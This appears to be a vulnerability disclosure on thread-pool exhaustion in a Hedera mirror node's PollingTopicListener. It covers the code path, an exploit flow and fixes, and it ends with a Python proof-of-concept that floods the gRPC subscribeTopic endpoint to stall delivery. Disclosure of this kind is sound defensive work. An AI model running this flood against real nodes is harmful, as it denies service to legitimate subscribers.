### Title
Bounded Elastic Thread Pool Exhaustion via Concurrent Blocking `findByFilter()` Calls in `PollingTopicListener`

### Summary
`PollingTopicListener.listen()` schedules each subscription's `poll()` invocation on a single shared `Schedulers.boundedElastic()` instance. Because `poll()` calls the synchronous, blocking JPA method `topicMessageRepository.findByFilter()` directly on that scheduler thread, an unprivileged attacker who opens enough concurrent gRPC subscriptions can saturate all available threads in the bounded pool. Once saturated, no new poll tasks can execute, halting topic message delivery for every subscriber on the node.

### Finding Description

**Exact code path:**

`PollingTopicListener.java` line 31 creates a single shared scheduler: [1](#0-0) 

`listen()` (lines 38–43) uses that scheduler both for the initial subscription delay and for every repeat delay: [2](#0-1) 

When the delay fires, Reactor re-subscribes to `Flux.defer(() -> poll(context))` **on the scheduler thread**. `poll()` immediately calls the blocking JPA method: [3](#0-2) 

`TopicMessageRepositoryCustomImpl.findByFilter()` executes `typedQuery.getResultList()` — a fully synchronous JDBC round-trip — before returning: [4](#0-3) 

**Root cause / failed assumption:** The design assumes `poll()` is a fast, non-blocking operation. In reality it is a synchronous JDBC call that holds the scheduler thread for the entire query duration (up to `db.statementTimeout = 10 000 ms` by default). [5](#0-4) 

**Exploit flow:**

1. Attacker opens *M* gRPC connections. Each connection is allowed `maxConcurrentCallsPerConnection = 5` concurrent calls. [6](#0-5) 

2. On each call the attacker sends a `subscribeTopic` request with `consensusStartTime = 0` (epoch). The `TopicMessageFilter` validator only requires `startTime <= now()`, so epoch is accepted. [7](#0-6) 

3. Each subscription's first `poll()` fires after `interval` (default 500 ms) on a scheduler thread and issues a query for up to `maxPageSize = 5 000` rows starting from timestamp 0 — a full historical scan. [8](#0-7) 

4. `Schedulers.boundedElastic()` defaults to `10 × availableProcessors` threads (e.g. 40 on a 4-core host). With `M × 5` concurrent subscriptions ≥ 40, every thread is blocked on a slow JDBC call for up to 10 seconds.

5. The `repeatWhen` scheduler for every other subscription cannot fire; poll tasks pile up in the 100 000-task queue but are never executed while threads remain occupied. Message delivery for all legitimate subscribers stalls.

### Impact Explanation

All topic message delivery through `PollingTopicListener` halts for the duration of the attack. Because `PollingTopicListener` is a singleton bean, the single shared scheduler is the only execution resource for every active subscription. Legitimate subscribers receive no new messages until the attacker releases connections or the `db.statementTimeout` expires and threads are freed — at which point the attacker simply re-subscribes. The attack is self-sustaining with a modest number of connections.

### Likelihood Explanation

The gRPC `subscribeTopic` endpoint is unauthenticated and publicly reachable. No per-IP connection limit exists in the application code; the only per-connection cap is 5 concurrent calls, which the attacker trivially bypasses by opening multiple TCP connections. On a typical 4–8 core deployment, exhausting the thread pool requires only 40–80 concurrent subscriptions — achievable from a single machine. The `maxRatePerEndpoint: 250` GCP gateway setting limits new connection rate but does not cap total concurrent long-lived streaming subscriptions. [9](#0-8) 

### Recommendation

1. **Offload blocking work off the scheduler**: Wrap the `findByFilter` call with `Mono.fromCallable(() -> ...).subscribeOn(Schedulers.boundedElastic())` so the blocking call occupies a dedicated thread and the repeat-delay scheduler thread is released immediately.
2. **Enforce a per-IP or global subscription cap** at the application layer (e.g. an `AtomicInteger` counter checked in `listen()` before subscribing).
3. **Switch to `SHARED_POLL` or `REDIS` listener type** (already the default) for production, as `SharedPollingTopicListener` uses a single shared poll loop regardless of subscriber count, eliminating the per-subscription thread problem. [10](#0-9) 
4. **Reduce `db.statementTimeout`** to a value well below the scheduler's thread-hold window to limit per-query blocking time.

### Proof of Concept

```python
import grpc, threading
# proto stubs for com.hedera.mirror.api.proto.ConsensusService
from mirror_proto import consensus_pb2, consensus_pb2_grpc

TARGET = "mirror-node-grpc:5600"
TOPIC  = consensus_pb2.TopicID(topicNum=1)
THREADS_TO_EXHAUST = 50   # > 10 * CPU_count

def flood():
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(ch)
    query = consensus_pb2.ConsensusTopicQuery(
        topicID=TOPIC,
        consensusStartTime=consensus_pb2.Timestamp(seconds=0, nanos=0),  # epoch
        # no limit → infinite subscription
    )
    # Open 5 concurrent streams per connection (maxConcurrentCallsPerConnection)
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    for s in streams:
        try:
            for _ in s:   # consume slowly to keep stream alive
                pass
        except Exception:
            pass

threads = [threading.Thread(target=flood) for _ in range(THREADS_TO_EXHAUST // 5)]
for t in threads: t.start()
# After ~500ms (listener interval), all boundedElastic threads are occupied
# by blocking findByFilter() calls. Legitimate subscribers stop receiving messages.
for t in threads: t.join()
```

**Expected result:** Legitimate `subscribeTopic` clients stop receiving messages within 1–2 poll intervals. Server logs show poll tasks queuing without execution. Releasing attacker connections restores delivery.
